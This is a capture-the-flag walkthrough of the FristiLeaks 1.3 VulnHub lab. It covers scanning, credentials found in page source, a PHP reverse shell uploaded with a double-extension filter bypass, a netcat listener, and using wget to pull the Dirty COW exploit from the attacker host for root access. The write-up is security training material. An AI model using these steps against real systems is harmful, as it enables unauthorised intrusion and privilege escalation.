---
layout: post
title: "FRISTLEAKS 1.3 MACHINE"
date: 2026-04-06
categories: [Vulnhub Machines]
tags: [vulnhub, linux, enumeration, privilege-escalation, penetration-testing]
---

# Fristileaks Machine Overview

The **Fristileaks 1.3** machine is A small VM made for a Dutch informal hacker meet up called Fristileaks.The primary objective is to move from an external network position to a fully privileged root user. This machine highlights web misconfigurations, hidden directories, and kernel vulnerabilities. My goal was to identify an entry point through the web server, establish a foothold, and then systematically escalate my privileges to gain total control of the system.

---

# INITIAL ACCESS

## Information Gathering

I started by gathering information of the machine so that I can get its ip address. I scanned for the machine’s ip address using arp scan and I got the machine’s ip address as the mac address matches what was provided on the description of the task. Fristi’s ip address was identified as `192.168.56.114`.

`└─$ sudo arp-scan -l`
![fristleaks 1](/images/fristleaks/fristleaks1.png)

## Service Enumeration

After acquiring the machine’s ip address I scanned for any open ports, services and versions running by executing:

`└─$ sudo nmap -Pn –sSV -p- -oA output 192.168.56.114`

![fristleaks 2](/images/fristleaks/fristleaks2.png)

I discovered only port 80 was open and it runs on Apache.

---

# GAINING ACCESS

## Inspecting port 80: Http

I opened my browser to access port 80 since it is web based and it displayed “keep calm and drink fristi”.

`http://192.168.56.114`
![fristleaks 3](/images/fristleaks/fristleaks3.png)

After exploring the source code and any links on the webpage I found nothing of interested. 
I performed a nikto scan that reveals any hidden files or directories and I discovered one robots.txt containing the entries /cola, /beer and /sisi.

![fristleaks 4](/images/fristleaks/fristleaks4.png)

I modified the URL by adding the entries /cola, /beer and sisi and the image below was displayed.
`http://192.168.56.114/cola`

![fristleaks 5](/images/fristleaks/fristleaks5.png)


I noticed that the name **cola**, **beer**, **sisi** and **fristi** were all drinks. So I decided to modify my url with the entry `/fristi` and an admin portal was displayed.

![fristleaks 6](/images/fristleaks/fristleaks6.png)

I then right clicked on the webpage to view source. I was checking for any credential hints that may have been left on the code. I noticed that some clean-up comment was left out that suggested a user `ezeepz` existed.

![fristleaks 7](/images/fristleaks/fristleaks7.png)

 I then noticed that there is the use of base64 encoding for images. I searched through the source code and found a base 64 encoded message that was commented.

![fristleaks 8](/images/fristleaks/fristleaks8.png)

I decoded the message using a base64decode tool:https://www.base64decode.org/ and the only readable thing displayed was png. 

![fristleaks 9](/images/fristleaks/fristleaks9.png)

![fristleaks 10](/images/fristleaks/fristleaks10.png)

Getting Png implied that it is an encoded image file. I used a base 64 png decoder tool:'https://onlinepngtools.com/convert-base64-to-png' to decode the image and `keKkeKKeKKeKkEkkEk` was displayed.

![fristleaks 11](/images/fristleaks/fristleaks11.png)

I assumed that the text: `keKkeKKeKKeKkEkkEk` was the password left out by the user `ezeepz`, so I tried to login with those credentials. Login was successful.

![fristleaks 12](/images/fristleaks/fristleaks12.png)

The page displayed required a file upload and what came to mind was uploading a malicious file. 

![fristleaks 13](/images/fristleaks/fristleaks13.png)

![fristleaks 14](/images/fristleaks/fristleaks14.png)

I then downloaded a php reverse shell file.

![fristleaks 15](/images/fristleaks/fristleaks15.png)

 I used the vim editor to edit the ip address on the file to that of my attacking machine which is kali Linux `192.168.56.113`. I decided to leave the port as default which was 1234.

 ![fristleaks 16](/images/fristleaks/fristleaks16.png)

 ![fristleaks 17](/images/fristleaks/fristleaks17.png)

I uploaded the file but it required me to upload a png file instead of a php file. 

![fristleaks 18](/images/fristleaks/fristleaks18.png)

I then renamed my file from `php-reverse-shell.php` to `phprevereshell.php.png` to trick the website that a png file is being uploaded. I went ahead to upload the file and `/uploads` was displayed.

![fristleaks 19](/images/fristleaks/fristleaks19.png)

After modifying my URL by adding `/uploads` I added the name of the reverse shell file which is `phpreverseshell.php.png` and before pressing enter I started a netcat listener on port 1234 for a connection.

![fristleaks 20](/images/fristleaks/fristleaks20.png)

`└─$ nc –nlvp 1234`

![fristleaks 21](/images/fristleaks/fristleaks21.png)

After running the modified URL, a reverse shell was gained. 

![fristleaks 22](/images/fristleaks/fristleaks22.png)

I then checked the directory I gained access to and it was the `/tmp` directory where I could write to.

![fristleaks 23](/images/fristleaks/fristleaks23.png)
---

# PRIVILEGE ESCALATION

I checked the kernel in use and discovered it was an old version 2.6.32 that could be exploited. I searched for exploits on the exploit database that could work against the old kernel version. I downloaded the Dirty cow exploit that deals with privilege escalation.

![fristleaks 23](/images/fristleaks/fristleaks23.png)

![fristleaks 24](/images/fristleaks/fristleaks24.png)

I created an http server and specified a listener on port 8080 as we are using wget to fetch the file. I ran the wget command to fetch the downloaded exploit file from kali to the shell.

`└─$ python3 -m http.server 8080`

![fristleaks 25](/images/fristleaks/fristleaks25.png)

`└─$ wget http://192.168.56.113:8080/40839.c`

![fristleaks 26](/images/fristleaks/fristleaks26.png)

I checked the exploit file details on how to compile the exploit and I found a command to run. I renamed the syntax with the correct exploit file name and then ran.

![fristleaks 27](/images/fristleaks/fristleaks27.png)

`└─$ gcc -pthread 40839.c -o dirty –lcrypt`

`└─$ ls`

![fristleaks 27.1](/images/fristleaks/fristleaks27.1.png)

I went ahead to change the file mode to allow execution by running the chmod command and then executed it with the `./dirty` command.

`└─$ chmod +x dirty`

`└─$ ./dirty`

![fristleaks 28](/images/fristleaks/fristleaks28.png)

The new user `firefart` was created after the exploit was complete. I ran the `/etc/passwd` to check the user’s privileges and they got root privileges.

![fristleaks 29](/images/fristleaks/fristleaks29.png)

`└─$ cat /etc/passwd`

![fristleaks 30](/images/fristleaks/fristleaks30.png)

I changed to the `firefart` user but I ran to an issue with restricted shell. I fixed it by creating a new bash shell using python scrip that is connected to the terminal.

`└─$ python –c ‘import pty;pty.spawn(“/bin/bash”)’`

![fristleaks 31](/images/fristleaks/fristleaks31.png)

I reran the command `su` to change user to `firefart` and I was in as a `firefart` user.

`└─$ su firefart`

![fristleaks 32](/images/fristleaks/fristleaks32.png)

I checked the `id` and it confirmed `firefart` has root privileges.

`└─$ id`

![fristleaks 33](/images/fristleaks/fristleaks33.png)

I changed directory to root and checked for any files. I discovered the `fristileaks_secrets.txt` file.

`└─$ cd /root`

`└─$ ls`

![fristleaks 34](/images/fristleaks/fristleaks34.png)

I viewed the details on `secrets.txt` file and found the flag: `Y0u_kn0w_y0u_love_fr1st1`.

`└─$ cat fristileaks_secrets.txt`

![fristleaks 35](/images/fristleaks/fristleaks35.png)